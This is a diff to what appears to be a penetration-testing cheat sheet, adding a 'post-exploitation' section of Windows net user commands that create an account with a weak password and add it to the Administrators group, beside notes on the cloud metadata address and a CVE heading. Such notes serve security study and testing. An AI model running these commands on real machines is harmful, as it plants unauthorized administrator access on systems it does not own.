@@ -455,6 +455,17 @@ This can be used if we have a shell on a target machine to download a file (like
 **169.254.169.254** : link-local address used by cloud providers (AWS, GCP...) to provide metadata on the running instance.
 
 
+## Create an admin user in Windows (post-exploitation)
+
+```shell
+net user toto /add                         # create a user "toto"
+net user toto pass                         # set his password to "pass"
+net localgroup administrators toto /add    # add him to the Administrators group
+
+net user toto /delete                      # delete the user if no longer needed
+```
+
+
 ## Famous CVEs
 
 ### Moniker Link (CVE-2024-21413 - score 9.8)
